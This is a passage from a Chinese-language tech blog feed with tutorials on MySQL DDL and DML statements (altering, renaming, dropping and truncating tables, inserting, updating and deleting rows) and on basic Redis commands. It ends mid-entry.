<h3 id="（3）重命名字段"><a href="#（3）重命名字段" class="headerlink" title="（3）重命名字段"></a>（3）重命名字段</h3><ul>
<li>使用 <code>CHANGE old_column new_column dataType</code>子句重命名列。语法格式如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE [<span class="keyword">column</span>] 列名 新列名 新数据类型;</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">CHANGE salary monthly_salary <span class="keyword">DOUBLE</span>(<span class="number">10</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">CHANGE email my_email <span class="type">VARCHAR</span>(<span class="number">50</span>);</span><br></pre></td></tr></table></figure>



<h3 id="（4）删除字段"><a href="#（4）删除字段" class="headerlink" title="（4）删除字段"></a>（4）删除字段</h3><ul>
<li>删除表中某个字段的语法格式如下</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> [<span class="keyword">COLUMN</span>] 字段名</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> my_email;</span><br></pre></td></tr></table></figure>

<h2 id="3-重命名表"><a href="#3-重命名表" class="headerlink" title="3. 重命名表"></a>3. 重命名表</h2><ul>
<li>方式一：使用<code>RENAME</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">RENAME <span class="keyword">TABLE</span> emp</span><br><span class="line"><span class="keyword">TO</span> myemp;</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">RENAME <span class="keyword">TABLE</span> myemp1</span><br><span class="line"><span class="keyword">TO</span> myemp11;</span><br></pre></td></tr></table></figure>

<ul>
<li>方式二：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> dept</span><br><span class="line">RENAME [<span class="keyword">TO</span>] detail_dept;</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp2</span><br><span class="line">RENAME <span class="keyword">TO</span> myemp12;</span><br></pre></td></tr></table></figure>

<h2 id="4-删除表"><a href="#4-删除表" class="headerlink" title="4. 删除表"></a>4. 删除表</h2><ul>
<li>在MySQL中，当一张数据表&#x3D;&#x3D;没有与其他任何数据表形成关联关系&#x3D;&#x3D;时，可以将当前数据表直接删除。</li>
<li>数据和结构都被删除</li>
<li>所有正在运行的相关事务被提交</li>
<li>所有相关索引被删除</li>
<li>语法格式：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [IF <span class="keyword">EXISTS</span>] 数据表<span class="number">1</span> [, 数据表<span class="number">2</span>, …, 数据表n];</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>IF EXISTS</code> 的含义为：如果当前数据库中存在相应的数据表，则删除数据表；如果当前数据库中不存在相应的数据表，则忽略删除语句，不再执行删除数据表的操作。</p>
</blockquote>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 不光将表结构删除掉，同时表中的数据也删除掉，释放表空间</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> myemp2;</span><br></pre></td></tr></table></figure>


<ul>
<li><code>DROP TABLE</code> 语句不能回滚</li>
<li><code>DROP TABLE</code> 语句不能回滚</li>
<li><code>DROP TABLE</code> 语句不能回滚</li>
</ul>
<h2 id="5-清空表"><a href="#5-清空表" class="headerlink" title="5. 清空表"></a>5. 清空表</h2><ul>
<li><code>TRUNCATE TABLE</code>语句：<ul>
<li>删除表中所有的数据</li>
<li>释放表的存储空间</li>
</ul>
</li>
</ul>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> employees_copy;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> employees_copy;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>TRUNCATE</code>语句不能回滚，而使用 <code>DELETE</code> 语句删除数据，可以回滚</p>
</li>
<li><p><code>TRUNCATE</code>语句 比 <code>DELETE</code> 速度快，且使用的系统和事务日志资源少，但 <code>TRUNCATE</code> 无事务且不触发 <code>TRIGGER</code>，有可能造成事故，故不建议在开发代码中使用此语句。</p>
</li>
<li><p>说明：<code>TRUNCATE</code> 在功能上与不带 <code>WHERE</code> 子句的 <code>DELETE</code> 语句相同。</p>
</li>
</ul>
<p>关于 TRUNCATE 和 DELETE 的对比可见<a href="https://blog.csdn.net/qq_51938362/article/details/127436559?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22127436559%22,%22source%22:%22qq_51938362%22%7D"> DCL中 COMMIT 与 ROLLBACK 的使用</a></p>
<h2 id="6-临时表"><a href="#6-临时表" class="headerlink" title="6. 临时表"></a>6. 临时表</h2><ul>
<li><p>MySQL 临时表在我们需要保存一些临时数据时是非常有用的。临时表只在当前连接可见，当关闭连接时，Mysql会自动删除表并释放所有空间。</p>
</li>
<li><p>临时表在MySQL 3.23版本中添加，如果你的MySQL版本低于 3.23版本就无法使用MySQL的临时表。不过现在一般很少有再使用这么低版本的MySQL数据库服务了。</p>
</li>
<li><p>如果你使用了其他MySQL客户端程序连接MySQL数据库服务器来创建临时表，那么只有在关闭客户端程序时才会销毁临时表，当然你也可以手动销毁。</p>
</li>
<li><p>当你使用 <code>SHOW TABLES</code>命令显示数据表列表时，你将无法看到临时表。</p>
</li>
</ul>
<h3 id="（1）创建"><a href="#（1）创建" class="headerlink" title="（1）创建"></a>（1）创建</h3><p>这与普通表的格式是大致差不多的，只需要在<code>CREATE TABLE</code>中添加一个<code>TEMPORARY</code> 即可。同样，他也有两种方式，“<strong>白手起家</strong>”以及“<strong>基于现有的表，同时导入数据</strong>”</p>
<ul>
<li>语法格式</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TEMPORARY  <span class="keyword">TABLE</span> [IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 临时表名(</span><br><span class="line">	字段<span class="number">1</span>, 数据类型 [约束条件] [默认值],</span><br><span class="line">	字段<span class="number">2</span>, 数据类型 [约束条件] [默认值],</span><br><span class="line">	字段<span class="number">3</span>, 数据类型 [约束条件] [默认值],</span><br><span class="line">	……</span><br><span class="line">	[表约束条件]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> TEMPORARY  <span class="keyword">TABLE</span> 临时表名</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">subquery</span><br></pre></td></tr></table></figure>


<h3 id="（2）删除"><a href="#（2）删除" class="headerlink" title="（2）删除"></a>（2）删除</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 临时表名;</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="四、删表需谨慎"><a href="#四、删表需谨慎" class="headerlink" title="四、删表需谨慎"></a>四、删表需谨慎</h1><h2 id="1-谨慎谨慎"><a href="#1-谨慎谨慎" class="headerlink" title="1. 谨慎谨慎"></a>1. 谨慎谨慎</h2><p>&#x3D;&#x3D;表删除&#x3D;&#x3D;操作将把表的定义和表中的数据一起删除，并且MySQL在执行删除操作时，不会有任何的确认信息提示，因此执行删除操时应当慎重。在删除表前，最好对表中的数据进行 备份 ，这样当操作失误时可以对数据进行恢复，以免造成无法挽回的后果。</p>
<p>同样的，在使用 <code>ALTER TABLE</code> 进行表的基本修改操作时，在执行操作过程之前，也应该确保对数据进行完整的&#x3D;&#x3D;备份&#x3D;&#x3D;，因为数据库的改变是&#x3D;&#x3D;无法撤销&#x3D;&#x3D;的，如果添加了一个不需要的字段，可以将其删除；相同的，如果删除了一个需要的列，该列下面的所有数据都将会丢失。</p>
<h2 id="2-MySQL8新特性—DDL的原子化"><a href="#2-MySQL8新特性—DDL的原子化" class="headerlink" title="2. MySQL8新特性—DDL的原子化"></a>2. MySQL8新特性—DDL的原子化</h2><p>在MySQL 8.0版本中，InnoDB表的DDL支持事务完整性，即 &#x3D;&#x3D;DDL操作要么成功要么回滚&#x3D;&#x3D; 。DDL操作回滚日志写入到data dictionary数据字典mysql.innodb_ddl_log（该表是隐藏的表，通过show tables无法看到）中，用于回滚操作。通过设置参数，可将DDL操作日志打印输出到MySQL错误日志中。</p>
<p>分别在MySQL 5.7版本和MySQL 8.0版本中创建数据库和数据表，结果如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE mytest;</span><br><span class="line">USE mytest;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book1(</span><br><span class="line">	book_id <span class="type">INT</span> ,</span><br><span class="line">	book_name <span class="type">VARCHAR</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure>

<ul>
<li>在MySQL 5.7版本中，测试步骤如下： 删除数据表book1和数据表book2，结果如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DROP</span> <span class="keyword">TABLE</span> book1,book2;</span><br><span class="line">ERROR <span class="number">1051</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;mytest.book2&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span># 再次查询数据库中的数据表名称，结果如下：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> TABLES;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># 从结果可以看出，虽然删除操作时报错了，但是仍然删除了数据表book1。</span><br></pre></td></tr></table></figure>

<ul>
<li>在MySQL 8.0版本中，测试步骤如下： 删除数据表book1和数据表book2，结果如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DROP</span> <span class="keyword">TABLE</span> book1,book2;</span><br><span class="line">ERROR <span class="number">1051</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;mytest.book2&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span># 再次查询数据库中的数据表名称，结果如下：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> TABLES;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_mytest <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> book1 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># 从结果可以看出，数据表book1并没有被删除。</span><br></pre></td></tr></table></figure>


<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL之玩转DML</title>
    <url>/posts/36b2021f.html</url>
    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>DML（Data Manipulation Language、数据操作语言），用于添加、删除、更新和查询数据库记录，并检查数据完整性。</p>
<ul>
<li>主要的语句关键字包括 INSERT 、 DELETE 、 UPDATE 、 SELECT 等。</li>
<li>因为查询语句使用的非常的频繁，所以很多人把查询语句单拎出来一类：DQL（数据查询语言）。因此文本只对DML中的增、删、改做描述，关于 SELECT 详情可见<a href="https://blog.csdn.net/qq_51938362/article/details/127386748"> SQL之玩转SELECT</a></li>
</ul>
<p><strong>储备工作，建表</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> emp1(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 		id <span class="type">INT</span>,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 		`name` <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 		hire_date <span class="type">DATE</span>,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 		salary <span class="keyword">DOUBLE</span>(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.31</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> emp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field     <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id        <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">15</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date <span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> salary    <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> emp1;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="二、插入数据"><a href="#二、插入数据" class="headerlink" title="二、插入数据"></a>二、插入数据</h1><h2 id="1-VALUES的方式添加"><a href="#1-VALUES的方式添加" class="headerlink" title="1. VALUES的方式添加"></a>1. VALUES的方式添加</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、为表的所有字段按默认顺序插入数据</span><br><span class="line"># 正确的 注意：一定要按照声明的字段的先后顺序添加</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;2000-12-21&#x27;</span>,<span class="number">3400</span>); </span><br><span class="line"># 错误的</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">2</span>,<span class="number">3400</span>,<span class="string">&#x27;2000-12-21&#x27;</span>,<span class="string">&#x27;Jerry&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、指明要添加的字段 （推荐）</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1(id,hire_date,salary,`name`)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;1999-09-09&#x27;</span>,<span class="number">4000</span>,<span class="string">&#x27;Jerry&#x27;</span>);</span><br><span class="line"># 说明：没有进行赋值的hire_date 的值为 <span class="keyword">null</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1(id,salary,`name`)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="number">4500</span>,<span class="string">&#x27;shk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、同时插入多条记录 （推荐）</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1(id,NAME,salary)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">4</span>,<span class="string">&#x27;Jim&#x27;</span>,<span class="number">5000</span>),</span><br><span class="line">(<span class="number">5</span>,<span class="string">&#x27;TYT&#x27;</span>,<span class="number">5500</span>);</span><br></pre></td></tr></table></figure>


<blockquote>
<ul>
<li><code>VALUES</code> 也可以写成 <code>VALUE</code> ，但是<code>VALUES</code>是标准写法。</li>
<li>字符和日期型数据应包含在单引号中。</li>
</ul>
</blockquote>
<h2 id="2-将查询结果插入到表中"><a href="#2-将查询结果插入到表中" class="headerlink" title="2. 将查询结果插入到表中"></a>2. 将查询结果插入到表中</h2><p>INSERT还可以将SELECT语句查询的结果插入到表中，此时不需要把每一条记录的值一个一个输入，只需要使用一条INSERT语句和一条SELECT语句组成的组合语句即可快速地从一个或多个表中向一个表中插入多行。</p>
<ul>
<li>基本语法格式如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 目标表名</span><br><span class="line">(tar_column1 [, tar_column2, …, tar_columnn])</span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">(src_column1 [, src_column2, …, src_columnn])</span><br><span class="line"><span class="keyword">FROM</span> 源表名</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>在 INSERT 语句中加入子查询</li>
<li>不必书写 VALUES 子句</li>
<li>子查询中的值列表应与 INSERT 子句中的列名对应</li>
</ul>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查询的字段一定要与添加到的表的字段一一对应</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp1(id,NAME,salary,hire_date)</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary,hire_date  </span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">WHERE</span> department_id <span class="keyword">IN</span> (<span class="number">60</span>,<span class="number">70</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、修改数据"><a href="#三、修改数据" class="headerlink" title="三、修改数据"></a>三、修改数据</h1><ul>
<li>使用 UPDATE 语句更新数据。语法如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span class="line"><span class="keyword">SET</span> column1<span class="operator">=</span>value1, column2<span class="operator">=</span>value2, … , columnn<span class="operator">=</span>valuen</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>可以一次更新多条数据</li>
<li>如果需要回滚数据，需要保证在DML前，进行设置：<code>SET AUTOCOMMIT = FALSE</code></li>
</ul>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 使用 <span class="keyword">WHERE</span> 子句指定需要更新的数据</span><br><span class="line"><span class="keyword">UPDATE</span> employees</span><br><span class="line"><span class="keyword">SET</span> department_id <span class="operator">=</span> <span class="number">70</span></span><br><span class="line"><span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">113</span>;</span><br><span class="line"></span><br><span class="line"># 如果省略 <span class="keyword">WHERE</span> 子句，则表中的所有数据都将被更新</span><br><span class="line"><span class="keyword">UPDATE</span> copy_emp</span><br><span class="line"><span class="keyword">SET</span> department_id <span class="operator">=</span> <span class="number">110</span>;</span><br><span class="line"></span><br><span class="line"># 修改数据时，是可能存在不成功的情况的。（可能是由于约束的影响造成的）</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="四、删除数据"><a href="#四、删除数据" class="headerlink" title="四、删除数据"></a>四、删除数据</h1><ul>
<li>使用 DELETE 语句从表中删除数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> tabel_name </span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 使用 <span class="keyword">WHERE</span> 子句删除指定的记录。</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> emp1</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 如果省略 <span class="keyword">WHERE</span> 子句，则表中的全部数据将被删除</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> emp1;</span><br><span class="line"></span><br><span class="line"># 在删除数据时，也有可能因为约束的影响，导致删除失败</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li>DML操作默认情况下，执行完以后都会自动提交数据。</li>
<li>如果希望执行完以后不自动提交数据，则需要使用 <code>SET autocommit = FALSE</code>，详情可见 <a href="https://blog.csdn.net/qq_51938362/article/details/127436559?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22127436559%22,%22source%22:%22qq_51938362%22%7D">DCL中 COMMIT 与 ROLLBACK 的使用</a></li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis基本操作</title>
    <url>/posts/49fbbc1.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><ul>
<li><strong>Redis是一个基于&#x3D;&#x3D;内存&#x3D;&#x3D;的key-value的结构数据库</strong>。它存储的value类型丰富，也被称为结构化的NoSql数据库。</li>
</ul>
<blockquote>
<p><strong>优点：</strong></p>
<ul>
<li>基于内存存储，读写性能高</li>
<li>适合存储热点数据（热点商品、咨询、新闻）</li>
<li>企业应用广泛</li>
</ul>
<hr>
<p><strong>Redis应用场景：</strong></p>
<ul>
<li>缓存</li>
<li>任务队列</li>
<li>消息队列</li>
<li>分布式锁</li>
</ul>
</blockquote>
<h1 id="二、Redis数据类型"><a href="#二、Redis数据类型" class="headerlink" title="二、Redis数据类型"></a>二、Redis数据类型</h1><p><strong>Redis存储的是key-value结构的数据，其中key是字符串类型，value有5种常用的数据类型：</strong></p>
<ul>
<li>字符串 string</li>
<li>哈希 hash</li>
<li>列表 list</li>
<li>集合 set</li>
<li>有序集合 sorted set</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164255.png" alt="  "></p>
<h1 id="三、Redis常用命令"><a href="#三、Redis常用命令" class="headerlink" title="三、Redis常用命令"></a>三、Redis常用命令</h1><h2 id="1-通用命令"><a href="#1-通用命令" class="headerlink" title="1. 通用命令"></a>1. 通用命令</h2><p><strong>常用通用命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换数据库</span></span><br><span class="line"><span class="keyword">select</span> &lt;dbname&gt;</span><br><span class="line"><span class="comment"># 查看当前数据库的 key 数量</span></span><br><span class="line">dbsize</span><br><span class="line"><span class="comment"># 清空当前库</span></span><br><span class="line">flushdb</span><br><span class="line"><span class="comment"># 通杀全部库</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment"># 查找所有符合给定模式（pattern）的key</span></span><br><span class="line">keys &lt;pattern&gt;</span><br><span class="line"><span class="comment"># 检查给定 key 是否存在</span></span><br><span class="line">exists &lt;key1 key2 ...&gt;</span><br><span class="line"><span class="comment"># 返回 key 所存储的值的类型</span></span><br><span class="line"><span class="built_in">type</span> &lt;key&gt;</span><br><span class="line"><span class="comment"># 当 key 存在时删除 key</span></span><br><span class="line">del &lt;key1 key2 ...&gt;</span><br><span class="line"><span class="comment"># 根据 value 选择非租塞删除</span></span><br><span class="line"><span class="built_in">unlink</span> &lt;key&gt; </span><br><span class="line"><span class="comment"># 为给定的 key 设置过期时间（秒数）</span></span><br><span class="line">expire &lt;key&gt; &lt;seconds&gt; </span><br><span class="line"><span class="comment"># 返回给定 key 的剩余生存时间（TTL，time to live），以秒为单位</span></span><br><span class="line">ttl &lt;key&gt;</span><br></pre></td></tr></table></figure>




<ul>
<li><code>keys &lt;pattern&gt;</code>：查找所有符合给定模式（pattern）的key</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164255.png" alt="  "></p>
<ul>
<li><code>exists &lt;key1 key2 ...&gt;</code>：检查给定 key 是否存在</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164255.png" alt="  "></p>
<ul>
<li><code>type &lt;key&gt;</code>：返回 key 所存储的值的类型</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164255.png" alt="  "></p>
<hr>
<ul>
<li><code>del &lt;key1 key2 ...&gt;</code>：当 key 存在时删除 key</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164255.png" alt="  "></p>
<hr>
<ul>
<li><code>unlink &lt;key&gt;</code>：根据 value 选择非租塞删除</li>
</ul>
<blockquote>
<p>仅将 keys 从 keyspace 元数据中删除，真正的删除会在后续异步操作</p>
</blockquote>
<hr>
<ul>
<li><code>expire &lt;key&gt; &lt;seconds&gt;</code>：为给定的 key 设置过期时间（秒数）</li>
</ul>
<hr>
<ul>
<li><code>ttl &lt;key&gt;</code>：返回给定 key 的剩余生存时间（TTL，time to live），以秒为单位</li>
</ul>
<blockquote>
<p><code>-1</code> 表示用不过期，<code>-2</code> 表示已经过期</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815164255.png" alt="  "></p>
<hr>
<h2 id="2-字符串-string-操作命令"><a href="#2-字符串-string-操作命令" class="headerlink" title="2. 字符串 string 操作命令"></a>2. 字符串 string 操作命令</h2><p><strong>Redis中字符串类型常用命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置 key 的值</span></span><br><span class="line"><span class="built_in">set</span> &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 获取指定 key 的值</span></span><br><span class="line">get &lt;key&gt;</span><br><span class="line"><span class="comment"># 将给定的 value 追加到原值的末尾</span></span><br><span class="line">append &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 获取值的长度</span></span><br><span class="line">strlen &lt;key&gt; </span><br><span class="line"><span class="comment"># 只有在 key 不存在时才设置 key 的值</span></span><br><span class="line">setnx &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 将 key 存储的数字值 + 1</span></span><br><span class="line">incr &lt;key&gt;</span><br><span class="line"><span class="comment"># 将 key 存储的数字值 - 1</span></span><br><span class="line">decr &lt;key&gt;</span><br><span class="line"><span class="comment"># 将 key 中 存储的数字值增减，自定义步长</span></span><br><span class="line">incrby / decrby &lt;key&gt; &lt;步长&gt;</span><br><span class="line"><span class="comment"># 设置指定 key 的值，并将 key 的过期时间设为 seconds 秒</span></span><br><span class="line">setex &lt;key&gt; &lt;seconds&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 同时设置一个或多个 key-value 对</span></span><br><span class="line">mset &lt;key1 value1 key2 value2 ..&gt;</span><br><span class="line"><span class="comment"># 同时获取一个或多个 value</span></span><br><span class="line">mget &lt;key1 key2 ..&gt;</span><br><span class="line"><span class="comment"># 同时设置一个或多个 key-value 对，当且仅当所有给定 key不存在</span></span><br><span class="line">msetnx &lt;key1 value1 key2 value2 ..&gt;</span><br><span class="line"><span class="comment"># 获取值的范围，类似切片（索引从 0 开始）</span></span><br><span class="line">getrange 